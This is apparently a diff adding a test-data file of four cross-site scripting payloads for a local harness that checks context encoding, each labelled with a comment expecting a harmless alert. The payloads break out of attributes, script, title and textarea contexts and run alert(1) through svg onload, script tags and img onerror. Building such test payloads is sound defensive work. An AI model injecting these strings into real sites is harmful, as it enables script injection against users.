@@ -1,0 +1,8 @@
+# Local harness context; filter target: context encoding; expected: harmless alert in vulnerable page.
+'"><svg/onload=alert(1)>
+# Local harness context; filter target: context encoding; expected: harmless alert in vulnerable page.
+</script><script>alert(1)</script>
+# Local harness context; filter target: context encoding; expected: harmless alert in vulnerable page.
+javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>
+# Local harness context; filter target: context encoding; expected: harmless alert in vulnerable page.
+"><img src=x onerror=alert(1)>
